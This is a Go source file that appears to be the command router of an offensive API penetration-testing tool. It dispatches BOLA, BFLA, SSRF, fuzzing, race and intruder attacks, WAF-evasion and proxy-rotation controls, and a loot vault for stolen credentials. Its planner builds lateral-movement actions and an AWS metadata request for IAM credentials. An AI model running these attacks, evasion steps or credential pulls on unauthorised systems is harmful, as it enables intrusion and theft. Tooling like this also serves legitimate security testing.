package engine

import (
	"fmt"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/JoseMariaMicoli/VaporTrace/pkg/attack"
	"github.com/JoseMariaMicoli/VaporTrace/pkg/db"
	"github.com/JoseMariaMicoli/VaporTrace/pkg/discovery"
	"github.com/JoseMariaMicoli/VaporTrace/pkg/logic"
	"github.com/JoseMariaMicoli/VaporTrace/pkg/report"
	"github.com/JoseMariaMicoli/VaporTrace/pkg/utils"
)

// --- STRATEGIC PLANNER STRUCTURES ---

// TacticalAction represents a single step in the HITL workflow (Extended for Full Autonomy - Sprint 11.2)
type TacticalAction struct {
	ID           int
	Type         string // BOLA, BFLA, INJECTION, BYPASS
	Target       string
	Payload      string
	Confidence   string // HIGH, MED, LOW, CRITICAL
	Reasoning    string // AI explanation
	Status       string // PENDING, EXECUTED, DROPPED
	PreCondition string // DataSilo key to check before execution (e.g., "k8s_token", "admin_session")
	ChainID      string // Links related actions for autonomous execution
	Loot         string // Captured data from execution (credentials, tokens, env vars)
}

// ActionBuffer is the global staging area for the planner
var ActionBuffer []TacticalAction

// LastCapturedRequest stores the most recent HTTP request for fuzzing analysis
var LastCapturedRequest string

// getTarget helps commands inherit the global target if no argument is provided
func getTarget(args []string) string {
	if len(args) > 0 {
		return args[0]
	}
	global := logic.CurrentSession.GetTarget()
	if global == "" || global == "http://localhost" {
		return ""
	}
	return global
}

// GetLastCapturedRequest returns the most recent HTTP request dump for AI analysis
func GetLastCapturedRequest() string {
	return LastCapturedRequest
}

// StoreLastRequest stores a request for later fuzzing analysis
func StoreLastRequest(reqDump string) {
	LastCapturedRequest = reqDump
}

// ExecuteCommand parses raw input strings and routes them to the appropriate logic module.
func ExecuteCommand(rawCmd string) {
	if rawCmd == "" {
		return
	}
	parts := strings.Fields(rawCmd)
	verb := strings.ToLower(parts[0])
	args := parts[1:]

	utils.TacticalLog(fmt.Sprintf("[yellow]EXEC:[-] %s", rawCmd))

	switch verb {
	// --- NEW TASKS COMMAND (Requested Feature) ---
	case "tasks":
		utils.TacticalLog("[cyan]=== ACTIVE TACTICAL TASKS ===[-]")

		// 1. Aggregator Status
		aggStatus := "[red]STOPPED"
		if logic.GlobalAggregator.Active {
			aggStatus = fmt.Sprintf("[green]RUNNING (Interval: %v)[-]", logic.GlobalAggregator.Interval)
		}
		utils.TacticalLog(fmt.Sprintf(" [white]Context Aggregator:[-] %s", aggStatus))

		// 2. Neural Engine Status
		neuroStatus := "[red]OFFLINE"
		if neuro := logic.GetGlobalNeuro(); neuro != nil && neuro.Active {
			neuroStatus = "[green]ACTIVE (Hybrid Mode)[-]"
		}
		utils.TacticalLog(fmt.Sprintf(" [white]Neural Engine:     [-] %s", neuroStatus))

		// 3. Interceptor Status
		intStatus := "[yellow]STANDBY (Passive)"
		if logic.InterceptorActive {
			intStatus = "[red]BLOCKING (Active)[-]"
		}
		utils.TacticalLog(fmt.Sprintf(" [white]HTTP Interceptor:  [-] %s", intStatus))

		// 4. Proxy Rotation
		proxyCount := len(logic.ProxyPool)
		proxyStatus := "[gray]Direct (No Proxy Pool)"
		if proxyCount > 0 {
			proxyStatus = fmt.Sprintf("[blue]ROTATING (%d Nodes Active)[-]", proxyCount)
		}
		utils.TacticalLog(fmt.Sprintf(" [white]Proxy Network:     [-] %s", proxyStatus))

		utils.TacticalLog("[cyan]=============================[-]")

	// --- NEURAL ENGINE (Sprint 10.6) ---
	// Task 4: AI Interaction
	case "ask":
		if len(args) == 0 {
			utils.TacticalLog("Usage: ask <your question>")
			return
		}
		question := strings.Join(args, " ")
		utils.TacticalLog(fmt.Sprintf("[blue]USER ASK:[-] %s", question))

		go func() {
			neuro := logic.GetGlobalNeuro()
			if !neuro.Active {
				utils.TacticalLog("[yellow]NEURO:[-] Engine inactive. Auto-starting Hybrid mode...")
				neuro.Configure("hybrid", "", "", "")
			}
			utils.LogNeural(fmt.Sprintf("[gray]>>> USER QUERY: %s[-]", question))
			resp, err := neuro.ExecuteQuery(question)
			if err != nil {
				utils.TacticalLog(fmt.Sprintf("[red]NEURO ERROR:[-] %v", err))
				return
			}
			utils.LogNeural(fmt.Sprintf("\n[cyan]=== NEURO RESPONSE ===[-]\n[white]%s[-]\n", resp))
		}()

	case "neuro":
		if len(args) == 0 {
			utils.TacticalLog("Usage: neuro config | neuro on | neuro off")
			return
		}
		if args[0] == "config" {
			if len(args) < 3 {
				utils.TacticalLog("[red]Usage:[-] neuro config <provider> <model> [api_key] [endpoint]")
				return
			}
			provider := args[1]
			model := args[2]
			apiKey := ""
			endpoint := ""
			if len(args) > 3 {
				apiKey = args[3]
			}
			if len(args) > 4 {
				endpoint = args[4]
			}
			neuro := logic.GetGlobalNeuro()
			neuro.Configure(provider, apiKey, model, endpoint)
		} else if args[0] == "on" {
			neuro := logic.GetGlobalNeuro()
			neuro.Active = true
			utils.TacticalLog("[green]Neural Engine Activated.[-]")
		} else if args[0] == "off" {
			neuro := logic.GetGlobalNeuro()
			neuro.Active = false
			utils.TacticalLog("[yellow]Neural Engine Deactivated.[-]")
		}

	case "test-neuro":
		utils.TacticalLog("[blue]Testing Neural Engine Connectivity...[-]")
		neuro := logic.GetGlobalNeuro()
		neuro.TestConnectivity()

	case "neuro-gen":
		if len(args) < 2 {
			utils.TacticalLog("[yellow]Usage: neuro-gen <context_string> <count>")
			return
		}
		count, _ := strconv.Atoi(args[1])
		if neuro := logic.GetGlobalNeuro(); neuro != nil {
			neuro.GenerateAttackVectors(args[0], count)
		} else {
			utils.TacticalLog("[red]Error: Neuro engine not initialized")
		}

	// --- IDENTITY & SESSION ---
	case "auth":
		if len(args) < 2 {
			utils.TacticalLog("[red]Usage:[-] auth <attacker|victim> <token>")
			return
		}
		if args[0] == "attacker" {
			logic.CurrentSession.AttackerToken = args[1]
		} else {
			logic.CurrentSession.VictimToken = args[1]
		}
		utils.TacticalLog(fmt.Sprintf("[green]Identity Updated:[-] %s", args[0]))

	case "target":
		if len(args) > 0 {
			err := logic.CurrentSession.SetGlobalTarget(args[0])
			if err != nil {
				utils.TacticalLog(fmt.Sprintf("[red]Target Error:[-] %v", err))
			} else {
				utils.TacticalLog(fmt.Sprintf("[green]Target Locked:[-] %s", args[0]))
			}
		}

	case "sessions":
		utils.TacticalLog(fmt.Sprintf("Attacker Token: %s...", shortToken(logic.CurrentSession.AttackerToken)))
		utils.TacticalLog(fmt.Sprintf("Victim Token:   %s...", shortToken(logic.CurrentSession.VictimToken)))

	// --- DISCOVERY & RECON ---
	case "swagger":
		target := getTarget(args)
		if target == "" {
			utils.TacticalLog("[red]Error:[-] Usage: swagger <url> (or set global target)")
			return
		}
		utils.TacticalLog(fmt.Sprintf("[blue]Parsing OpenAPI spec at %s...[-]", target))
		go func() {
			endpoints, err := discovery.ParseSwagger(target, "")
			if err != nil {
				utils.TacticalLog(fmt.Sprintf("[red]Swagger Failed:[-] %v", err))
				return
			}
			utils.TacticalLog(fmt.Sprintf("[green]Success:[-] Found %d endpoints.", len(endpoints)))
		}()

	case "scrape":
		target := getTarget(args)
		if target == "" {
			utils.TacticalLog("[red]Error:[-] Usage: scrape <js_url> (or set global target)")
			return
		}
		utils.TacticalLog(fmt.Sprintf("[blue]Scraping JS Bundle: %s...[-]", target))
		go func() {
			paths, err := discovery.ExtractJSPaths(target, "")
			if err != nil {
				utils.TacticalLog(fmt.Sprintf("[red]Scrape Failed:[-] %v", err))
				return
			}
			utils.TacticalLog(fmt.Sprintf("[green]Success:[-] Extracted %d paths.", len(paths)))
		}()

	case "mine":
		target := getTarget(args)
		endpoint := ""
		if len(args) >= 2 {
			target = args[0]
			endpoint = args[1]
		} else if len(args) == 1 && logic.CurrentSession.GetTarget() != "" {
			target = logic.CurrentSession.GetTarget()
			endpoint = args[0]
		}

		if target == "" {
			utils.TacticalLog("[red]Error:[-] Usage: mine <url> <endpoint>")
			return
		}

		utils.TacticalLog(fmt.Sprintf("[blue]Mining hidden parameters on %s%s...[-]", target, endpoint))
		go func() {
			discovery.MineParameters(target, endpoint, "")
			utils.TacticalLog("[green]Mining Sequence Complete.[-]")
		}()

	case "map":
		target := getTarget(args)
		if target != "" {
			utils.TacticalLog(fmt.Sprintf("[blue]Starting Phase 2 Recon against %s...[-]", target))
			go func() {
				endpoints, err := discovery.ParseSwagger(target, "")
				if err != nil {
					utils.TacticalLog(fmt.Sprintf("[red]Swagger Error:[-] %v", err))
				} else {
					utils.TacticalLog(fmt.Sprintf("[green]Swagger Mapped:[-] %d routes", len(endpoints)))
				}
				discovery.MineParameters(target, "", "")
				utils.TacticalLog("[green]Recon Map Finished.[-]")
			}()
		} else {
			utils.TacticalLog("[red]Error:[-] Usage: map <url> (or set global target first).")
		}

	case "spider":
		target := getTarget(args)
		depth := 2 // Default depth

		if len(args) > 1 {
			// Check for depth arg (simple parsing)
			if d, err := strconv.Atoi(args[1]); err == nil {
				depth = d
			}
		}

		if target == "" {
			utils.TacticalLog("[red]Usage:[-] spider <url> [depth] (or set global target)")
		} else {
			// Launch the fixed spider
			discovery.StartSpider(target, depth)
		}

	case "fuzz":
		// Usage: fuzz <url> [params|paths]
		target := getTarget(args)
		mode := "params"

		if len(args) > 1 {
			mode = args[1]
		}

		if target == "" {
			utils.TacticalLog("[red]Usage:[-] fuzz <url> [params|paths]")
			return
		}

		if mode == "paths" {
			go discovery.FuzzPaths(target, nil) // nil = use built-in top list
		} else {
			go discovery.FuzzParams(target, nil) // nil = use built-in top list
		}

	case "pipeline":
		utils.TacticalLog("[aqua]Initializing Industrialized Attack Pipeline...[-]")
		go func() {
			utils.TacticalLog(fmt.Sprintf("[blue]Concurrency Level: %d threads[-]", logic.CurrentSession.Threads))
			logic.RunPipeline(logic.CurrentSession.Threads)
		}()

	// --- LOGIC PROBES ---
	case "bola":
		target := getTarget(args)
		isPipeline := false
		if len(args) > 0 && (args[0] == "--pipeline" || args[0] == "-p") {
			isPipeline = true
		}
		if isPipeline {
			utils.TacticalLog("[aqua]Starting Mass BOLA Pipeline Scan...[-]")
			go logic.ExecuteMassBOLA(logic.CurrentSession.Threads)
		} else if target != "" {
			victim := "1"
			if len(args) >= 2 {
				target = args[0]
				victim = args[1]
			} else if len(args) == 1 && logic.CurrentSession.GetTarget() != "" {
				victim = args[0]
			}
			utils.TacticalLog(fmt.Sprintf("[blue]Launching Surgical BOLA Probe on %s (ID: %s)...[-]", target, victim))
			ctx := &logic.BOLAContext{BaseURL: target, VictimID: victim}
			go func() {
				ctx.ProbeSilent()
				utils.TacticalLog("[green]Surgical BOLA Probe Finished.[-]")
			}()
		} else {
			utils.TacticalLog("[red]Error:[-] No target set. Use 'target <url>' or 'bola <url> <id>'.")
		}

	case "bfla":
		if logic.CurrentSession.GetTarget() != "" {
			utils.TacticalLog("[aqua]Starting Mass BFLA Matrix (Verb Tampering)...[-]")
			go logic.ExecuteMassBFLA(logic.CurrentSession.Threads)
		} else {
			utils.TacticalLog("[red]Error:[-] No global target set. Run 'target <url>' first.")
		}

	case "bopla":
		if logic.CurrentSession.GetTarget() != "" {
			utils.TacticalLog("[aqua]Starting Mass BOPLA Fuzzer (Property Injection)...[-]")
			go logic.ExecuteMassBOPLA(logic.CurrentSession.Threads)
		} else {
			utils.TacticalLog("[red]Error:[-] No global target set. Run 'target <url>' first.")
		}

	case "exhaust":
		target := getTarget(args)
		param := "limit"
		if len(args) >= 2 {
			target = args[0]
			param = args[1]
		} else if len(args) == 1 && logic.CurrentSession.GetTarget() != "" {
			target = logic.CurrentSession.GetTarget()
			param = args[0]
		}
		if target == "" {
			utils.TacticalLog("[red]Usage:[-] exhaust <url> <param>")
		} else {
			go func() {
				utils.TacticalLog(fmt.Sprintf("[blue]Fuzzing Pagination on %s?%s=...[-]", target, param))
				ctx := &logic.ExhaustionContext{TargetURL: target, ParamName: param}
				ctx.FuzzPagination()
			}()
		}

	case "ssrf":
		target := getTarget(args)
		param := "url"
		cb := "http://127.0.0.1"
		if len(args) >= 3 {
			target = args[0]
			param = args[1]
			cb = args[2]
		} else if len(args) == 2 && logic.CurrentSession.GetTarget() != "" {
			target = logic.CurrentSession.GetTarget()
			param = args[0]
			cb = args[1]
		}
		if target == "" {
			utils.TacticalLog("[red]Usage:[-] ssrf <url> <param> <callback>")
		} else {
			go func() {
				utils.TacticalLog(fmt.Sprintf("[blue]Probing SSRF on %s (%s)...[-]", target, param))
				ctx := &logic.SSRFContext{TargetURL: target, ParamName: param, Callback: cb}
				ctx.Probe()
			}()
		}

	case "audit":
		target := getTarget(args)
		if target != "" {
			utils.TacticalLog(fmt.Sprintf("[blue]Auditing Security Headers/CORS on %s...[-]", target))
			ctx := &logic.MisconfigContext{TargetURL: target}
			go func() {
				ctx.Audit()
				utils.TacticalLog("[green]Audit Complete.[-]")
			}()
		} else {
			utils.TacticalLog("[red]Usage:[-] audit <url>")
		}

	case "probe":
		target := getTarget(args)
		iType := "generic"
		if len(args) >= 2 {
			target = args[0]
			iType = args[1]
		} else if len(args) == 1 {
			if strings.HasPrefix(args[0], "http") {
				target = args[0]
			} else if logic.CurrentSession.GetTarget() != "" {
				target = logic.CurrentSession.GetTarget()
				iType = args[0]
			}
		}
		if target == "" {
			utils.TacticalLog("[red]Usage:[-] probe <url> [type] (or set global target)")
		} else {
			utils.TacticalLog(fmt.Sprintf("[blue]Launching %s Integration Probe against %s...[-]", iType, target))
			ctx := &logic.IntegrationContext{TargetURL: target, IntegrationType: iType}
			go ctx.Probe()
		}

	case "intruder":
		// Syntax: intruder sniper <url> <param> <wordlist>
		if len(args) < 4 {
			utils.TacticalLog("[red]Usage:[-] intruder sniper <url> <param> <wordlist>")
			return
		}

		mode := strings.ToLower(args[0])
		target := args[1]
		param := args[2]
		wordlist := args[3]

		if mode != "sniper" {
			utils.TacticalLog("[red]Error:[-] Currently only 'sniper' mode is supported.")
			return
		}

		// Validate file existence before starting
		if _, err := os.Stat(wordlist); os.IsNotExist(err) {
			utils.TacticalLog(fmt.Sprintf("[red]Error:[-] Wordlist not found: %s", wordlist))
			return
		}

		utils.TacticalLog(fmt.Sprintf("[aqua]INTRUDER:[-] Initializing Sniper attack on %s (param: %s)", target, param))

		config := attack.IntruderConfig{
			TargetURL:    target,
			Param:        param,
			WordlistPath: wordlist,
			Concurrency:  logic.CurrentSession.Threads, // Use global thread setting
			Mode:         attack.Sniper,
		}

		go func() {
			attack.RunSniper(config)
			utils.TacticalLog("[green]INTRUDER:[-] Session finished. Check logs/db for anomalies.")
		}()

	case "race":
		// Syntax: race <url> [threads]
		if len(args) < 1 {
			utils.TacticalLog("[red]Usage:[-] race <url> [threads]")
			return
		}

		target := args[0]
		threads := 20 // Default to high concurrency for race conditions

		if len(args) > 1 {
			if t, err := strconv.Atoi(args[1]); err == nil {
				threads = t
			}
		}

		go func() {
			config := attack.RaceConfig{
				TargetURL: target,
				Method:    "GET", // Default, in future add flags for POST
				Threads:   threads,
			}
			attack.RunRace(config)
		}()

	// --- FLOW ENGINE ---
	case "flow":
		if len(args) == 0 {
			utils.TacticalLog("Flow Commands: list, run, clear, race.")
			return
		}
		switch args[0] {
		case "list":
			if len(logic.ActiveFlow) == 0 {
				utils.TacticalLog("Flow queue empty.")
			} else {
				for i, s := range logic.ActiveFlow {
					utils.TacticalLog(fmt.Sprintf("[%d] %s %s (%s)", i+1, s.Method, s.URL, s.Name))
				}
			}
		case "clear":
			logic.ActiveFlow = []logic.FlowStep{}
			logic.FlowContext = make(map[string]string)
			utils.TacticalLog("[yellow]Flow and Context Cleared.[-]")
		case "run":
			go logic.RunFlow()
		case "race":
			if len(args) < 3 {
				utils.TacticalLog("Usage: flow race <step_id> <threads>")
				return
			}
			id, _ := strconv.Atoi(args[1])
			threads, _ := strconv.Atoi(args[2])
			go logic.RunRace(id-1, threads)
		default:
			utils.TacticalLog("Unknown flow command.")
		}

	// --- SYSTEM & DB ---
	case "init_db":
		db.InitDB()
		utils.TacticalLog("[green]Database Persistence Initialized (Empty State).[-]")

	case "seed_db":
		utils.TacticalLog("[aqua]Injecting high-fidelity mock data for C-Level Report...[-]")
		go seedDatabase()

	case "reset_db":
		db.ResetDB()
		utils.TacticalLog("[yellow]Database Purged (Reset).[-]")

	case "report":
		report.GenerateMissionDebrief()

	case "weaver":
		interval := 60
		if len(args) > 0 {
			if i, err := strconv.Atoi(args[0]); err == nil {
				interval = i
			}
		}
		utils.TacticalLog(fmt.Sprintf("[magenta]Deploying Ghost-Weaver (Interval: %ds)...[-]", interval))
		config := logic.WeaverConfig{Interval: time.Duration(interval) * time.Second, Active: true}
		go logic.StartGhostWeaver(config)

	case "loot":
		if len(args) > 0 && args[0] == "list" {
			utils.TacticalLog("[magenta]Accessing Discovery Vault...[-]")
			if len(logic.Vault) == 0 {
				utils.TacticalLog("Vault is empty.")
			}
			for _, v := range logic.Vault {
				utils.TacticalLog(fmt.Sprintf("[yellow]%s[-] %s", v.Type, v.Value))
			}
		} else if len(args) > 0 && args[0] == "clear" {
			logic.Vault = []logic.Finding{}
			utils.TacticalLog("[green]Vault Purged.[-]")
		} else {
			utils.TacticalLog("Usage: loot list | loot clear")
		}

	case "proxy":
		if len(args) > 0 {
			if args[0] == "off" {
				logic.SetProxy("")
			} else {
				logic.SetProxy(args[0])
			}
		} else {
			utils.TacticalLog("[red]Usage:[-] proxy <url> | proxy off")
		}

	case "proxies":
		if len(args) > 0 {
			if args[0] == "load" && len(args) >= 2 {
				if err := logic.LoadProxiesFromFile(args[1]); err != nil {
					utils.TacticalLog(fmt.Sprintf("[red]Load Failed:[-] %v", err))
				} else {
					logic.InitializeRotaryClient()
					utils.TacticalLog(fmt.Sprintf("[green]Proxy Pool Loaded:[-] %d proxies active.", len(logic.ProxyPool)))
				}
			} else if args[0] == "reset" {
				logic.ProxyPool = []string{}
				logic.InitializeRotaryClient()
				utils.TacticalLog("[yellow]Proxy Pool Reset. Reverting to default transport.[-]")
			} else {
				utils.TacticalLog("[red]Usage:[-] proxies load <file> | proxies reset")
			}
		}

	case "clear":
		utils.TacticalLog("___CLEAR_SCREEN_SIGNAL___")

	case "usage":
		if len(args) > 0 && args[0] == "2" {
			printUsagePage2()
		} else {
			printUsage()
		}

	case "help":
		if len(args) > 0 {
			printHelp(args[0])
		} else {
			utils.TacticalLog("[white]Usage: help <command> OR 'help keys' for hotkeys[-]")
		}

	// --- STEALTH & EVASION CONTROL ---
	case "stealth":
		if len(args) == 0 {
			utils.TacticalLog("[yellow]Usage: stealth <mode|status|toggle|multiplier|off>[-]")
			utils.TacticalLog("[yellow]  stealth <mode>           - Set mode (aggressive|fast|silent|debug)")
			utils.TacticalLog("[yellow]  stealth off              - Disable all evasion (fastest mode)")
			utils.TacticalLog("[yellow]  stealth status           - Display current evasion status")
			utils.TacticalLog("[yellow]  stealth toggle <feat> on|off - Toggle feature (jitter|thinking|backoff|obfuscation|encoding)")
			utils.TacticalLog("[yellow]  stealth multiplier <val> - Set multiplier (0.1-5.0)")
			return
		}

		subcommand := strings.ToLower(args[0])
		switch subcommand {
		case "off":
			logic.SetEvasionToggle("jitter", false)      // Disable jitter when stealth is off
			logic.SetEvasionToggle("thinking", false)    // Disable contextual delays
			logic.SetEvasionToggle("backoff", false)     // Disable backoff completely when stealth is off
			logic.SetEvasionToggle("obfuscation", false) // Disable path noise
			logic.SetEvasionToggle("encoding", false)    // Disable payload encoding
			logic.SetGlobalMultiplier(0.2)               // Very fast multiplier (5x speedup)
			utils.TacticalLog("[green]STEALTH MODE: OFF[-]")
			utils.TacticalLog("[yellow]All evasion disabled. Running in fastest/most aggressive mode with User-Agent rotation only.[-]")
			utils.TacticalLog("[yellow]Note: Only User-Agent rotation will apply. No delays, no encoding, no path obfuscation.[-]")

		case "status":
			status := logic.GetStealthStatus()
			config := logic.GetStealthConfig()
			utils.TacticalLog(fmt.Sprintf("[cyan]EVASION STATUS:[-]\n%s\n[blue]Global Multiplier:[-] %.1fx", status, config.GlobalEvasionMultiplier))

		case "toggle":
			if len(args) < 3 {
				utils.TacticalLog("[red]Usage:[-] stealth toggle <feature> <on|off>")
				utils.TacticalLog("[yellow]Features:[-] jitter, thinking, backoff, obfuscation, encoding")
				return
			}
			feature := strings.ToLower(args[1])
			enabled := strings.ToLower(args[2]) == "on"
			logic.SetEvasionToggle(feature, enabled)
			state := "[red]OFF"
			if enabled {
				state = "[green]ON"
			}
			utils.TacticalLog(fmt.Sprintf("[cyan]Evasion:[-] %s %s", feature, state))

		case "multiplier":
			if len(args) < 2 {
				config := logic.GetStealthConfig()
				utils.TacticalLog(fmt.Sprintf("[cyan]Current Multiplier:[-] %.1fx (Range: 0.1x - 5.0x)", config.GlobalEvasionMultiplier))
				return
			}
			val, err := strconv.ParseFloat(args[1], 64)
			if err != nil {
				utils.TacticalLog(fmt.Sprintf("[red]Invalid value:[-] %s (use float 0.1-5.0)", args[1]))
				return
			}
			logic.SetGlobalMultiplier(val)
			utils.TacticalLog(fmt.Sprintf("[cyan]Delay Multiplier:[-] %.1fx applied to all evasion timings", val))

		case "aggressive", "fast", "silent", "debug":
			logic.SetStealthMode(subcommand)
			status := logic.GetStealthStatus()
			utils.TacticalLog(fmt.Sprintf("[green]Stealth Mode:[-] %s\n%s", subcommand, status))

		default:
			utils.TacticalLog(fmt.Sprintf("[red]Invalid subcommand:[-] %s (use: status, toggle, multiplier, off, or a mode)", subcommand))
		}

	case "stealth_status", "stealth status":
		status := logic.GetStealthStatus()
		config := logic.GetStealthConfig()
		utils.TacticalLog(fmt.Sprintf("[cyan]EVASION STATUS:[-]\n%s\n[blue]Global Multiplier:[-] %.1fx", status, config.GlobalEvasionMultiplier))

	case "stealth_toggle", "stealth toggle":
		if len(args) < 2 {
			utils.TacticalLog("[red]Usage:[-] stealth toggle <feature> <on|off>")
			utils.TacticalLog("[yellow]Features:[-] jitter, thinking, backoff, obfuscation, encoding")
			return
		}
		feature := strings.ToLower(args[0])
		enabled := strings.ToLower(args[1]) == "on"
		logic.SetEvasionToggle(feature, enabled)
		state := "[red]OFF"
		if enabled {
			state = "[green]ON"
		}
		utils.TacticalLog(fmt.Sprintf("[cyan]Evasion:[-] %s %s", feature, state))

	case "stealth_multiplier", "stealth multiplier":
		if len(args) < 1 {
			config := logic.GetStealthConfig()
			utils.TacticalLog(fmt.Sprintf("[cyan]Current Multiplier:[-] %.1fx (Range: 0.1x - 5.0x)", config.GlobalEvasionMultiplier))
			return
		}
		val, err := strconv.ParseFloat(args[0], 64)
		if err != nil {
			utils.TacticalLog(fmt.Sprintf("[red]Invalid value:[-] %s (use float 0.1-5.0)", args[0]))
			return
		}
		logic.SetGlobalMultiplier(val)
		utils.TacticalLog(fmt.Sprintf("[cyan]Delay Multiplier:[-] %.1fx applied to all evasion timings", val))

	case "evasion":
		if len(args) == 0 {
			utils.TacticalLog("[yellow]Evasion Techniques:[-] thinking, jitter, backoff, obfuscation, encoding, oob")
			utils.TacticalLog("[cyan]Usage:[-] evasion <technique> | evasion status")
			return
		}
		if args[0] == "status" {
			status := logic.GetStealthStatus()
			utils.TacticalLog(fmt.Sprintf("[magenta]ACTIVE EVASION TECHNIQUES:[-]\n%s", status))
			return
		}
		technique := strings.ToLower(args[0])
		switch technique {
		case "thinking":
			utils.TacticalLog("[cyan]ContextualThinkingTime:[-] Injects request-type delays (GET: 10-50ms, POST: 800-3000ms)")
		case "jitter":
			utils.TacticalLog("[cyan]Temporal Jitter:[-] Random variance in request timing using Gaussian distribution")
		case "backoff":
			utils.TacticalLog("[cyan]Adaptive Backoff:[-] Exponential backoff on rate limits with random intervals")
		case "obfuscation":
			utils.TacticalLog("[cyan]Path Obfuscation:[-] Cache busters, path parameters, double encoding, URL fragments")
		case "encoding":
			utils.TacticalLog("[cyan]Payload Encoding:[-] Gzip, Deflate, random whitespace in JSON, Base64 encoding")
		case "oob":
			utils.TacticalLog("[cyan]OOB Exfiltration:[-] AES-256-GCM encrypted channels (TCP, DNS, ICMP)")
		default:
			utils.TacticalLog(fmt.Sprintf("[red]Unknown technique:[-] %s", technique))
		}

	case "waf", "waf_detect", "waf detect":
		logic.ReportWAFDetection()

	case "__internal_shutdown":
		go func() {
			utils.TacticalLog("[red::b]INITIATING SEQUENTIAL SHUTDOWN...[-:-:-]")
			utils.TacticalLog("[blue]⠋[-] Terminating Network Stacks...")
			time.Sleep(500 * time.Millisecond)
			utils.TacticalLog("[green]✔[-] Network Terminated.")
			utils.TacticalLog("[blue]⠋[-] Closing Database Persistence...")
			db.CloseDB()
			time.Sleep(500 * time.Millisecond)
			utils.TacticalLog("[green]✔[-] Database Sync Complete.")
			utils.TacticalLog("[blue]⠋[-] Killing Ghost-Weaver Agents...")
			time.Sleep(500 * time.Millisecond)
			utils.TacticalLog("[green]✔[-] Agents Purged.")
			utils.TacticalLog("[red::b]SYSTEM HALTED. GOODBYE.[-:-:-]")
			time.Sleep(1200 * time.Millisecond)
			os.Exit(0)
		}()

	case "exit":
		utils.TacticalLog("[yellow]Calling internal shutdown sequence...[-]")
		ExecuteCommand("__internal_shutdown")

	case "oob", "oob_config", "oob_status":
		logic.ReportOOBStatus()

	default:
		if strings.HasPrefix(verb, "test-") {
			handleTestCommands(verb)
		} else {
			utils.TacticalLog(fmt.Sprintf("[red]Command not recognized:[-] %s", verb))
		}
	}
}

// --- STRATEGIC ENGINE LOGIC (SPRINT 11 CORE) ---

// === SPRINT 11.1: DYNAMIC DEPENDENCY INJECTION (DDI) ===
// DataSilo aggregates telemetry from all functional layers (F1-F4)
// F1: Dashboard Status (UI/Interceptor state)
// F2: pkg/discovery - Target topology and endpoint map
// F3: pkg/db - Credentials, loot, and compromised assets
// F4: pkg/logic/network & pkg/ai - Real-time traffic telemetry and SSRF results
type DataSilo struct {
	F1_DashboardStatus DashboardStatus
	F2_Discovery       DiscoveryData
	F3_Loot            LootData
	F4_Traffic         TrafficData
}

// DashboardStatus represents F1 telemetry
type DashboardStatus struct {
	InterceptorActive  bool
	GlobalTarget       string
	AttackerToken      string
	VictimToken        string
	ProxyActive        string
	ProxyPoolSize      int
	NeuroEngineActive  bool
	ContextAggregating bool
}

// DiscoveryData represents F2 telemetry
type DiscoveryData struct {
	Endpoints     []string
	EndpointCount int
}

// LootData represents F3 telemetry
type LootData struct {
	Credentials   []string
	JWTTokens     []string
	APIKeys       []string
	AWSKeys       []string
	TotalFindings int
}

// TrafficData represents F4 telemetry
type TrafficData struct {
	RequestsProcessed int
	StatusCodeMap     map[string]int
	SSRFLeaks         []string
	LastStatus        int
}

// AggregateDataSilo pulls real-time telemetry from ALL layers
// This is the core of Sprint 11.1 Autonomous Systems
func AggregateDataSilo() *DataSilo {
	endpoints := logic.GlobalDiscovery.GetEndpoints()
	silo := &DataSilo{
		F1_DashboardStatus: DashboardStatus{
			InterceptorActive:  logic.InterceptorActive,
			GlobalTarget:       logic.CurrentSession.GetTarget(),
			AttackerToken:      logic.CurrentSession.AttackerToken,
			VictimToken:        logic.CurrentSession.VictimToken,
			ProxyActive:        logic.GetConfiguredProxy(),
			ProxyPoolSize:      len(logic.ProxyPool),
			NeuroEngineActive:  func() bool { neuro := logic.GetGlobalNeuro(); return neuro != nil && neuro.Active }(),
			ContextAggregating: logic.GlobalAggregator.Active,
		},
		F2_Discovery: DiscoveryData{
			Endpoints:     endpoints,
			EndpointCount: len(endpoints),
		},
		F3_Loot: LootData{
			Credentials:   extractCredentials(),
			JWTTokens:     extractJWTTokens(),
			APIKeys:       extractAPIKeys(),
			AWSKeys:       extractAWSKeys(),
			TotalFindings: len(logic.Vault),
		},
		F4_Traffic: TrafficData{
			RequestsProcessed: 0, // Will be incremented by traffic logger
			StatusCodeMap:     logic.GetTrafficHistory(),
			SSRFLeaks:         []string{}, // Will be populated by SSRF detector
			LastStatus:        0,
		},
	}
	return silo
}

// === SPRINT 11.2: HEURISTIC STATE MACHINE ===
// ProcessHeuristicStateMachine evaluates cross-silo dependencies
// If F4 detects an SSRF leak of an internal IP, cross-reference with F2/F3
// to suggest autonomous lateral movement actions
func ProcessHeuristicStateMachine(silo *DataSilo) []TacticalAction {
	var actions []TacticalAction
	id := 1

	// STATE 1: SSRF DETECTED -> Suggest lateral movement
	for _, leak := range silo.F4_Traffic.SSRFLeaks {
		if strings.Contains(leak, "10.") || strings.Contains(leak, "172.16.") || strings.Contains(leak, "192.168.") {
			// Internal IP leaked! Try to map to known endpoints
			for _, endpoint := range silo.F2_Discovery.Endpoints {
				actions = append(actions, TacticalAction{
					ID:         id,
					Type:       "LATERAL_MOVEMENT",
					Target:     silo.F1_DashboardStatus.GlobalTarget + endpoint,
					Payload:    leak, // The leaked internal IP
					Confidence: "HIGH",
					Reasoning:  fmt.Sprintf("SSRF leaked internal IP %s. Attempting lateral movement via %s", leak, endpoint),
					Status:     "PENDING",
				})
				id++
				if id > 5 {
					break
				}
			}
		}
	}

	// STATE 2: AWS KEYS + SSRF = Cloud Pivot
	if len(silo.F3_Loot.AWSKeys) > 0 && len(silo.F4_Traffic.SSRFLeaks) > 0 {
		actions = append(actions, TacticalAction{
			ID:         id,
			Type:       "CLOUD_PIVOT",
			Target:     "169.254.169.254", // AWS Metadata endpoint
			Payload:    "GET /latest/meta-data/iam/security-credentials/",
			Confidence: "CRITICAL",
			Reasoning:  "AWS keys compromised + SSRF detected = High-probability metadata exfiltration",
			Status:     "PENDING",
		})
		id++
	}

	// STATE 3: JWT Present + Protected Endpoints = Privilege Escalation Test
	if len(silo.F3_Loot.JWTTokens) > 0 {
		for _, endpoint := range silo.F2_Discovery.Endpoints {
			if strings.Contains(strings.ToLower(endpoint), "admin") {
				actions = append(actions, TacticalAction{
					ID:         id,
					Type:       "TOKEN_SWAP",
					Target:     silo.F1_DashboardStatus.GlobalTarget + endpoint,
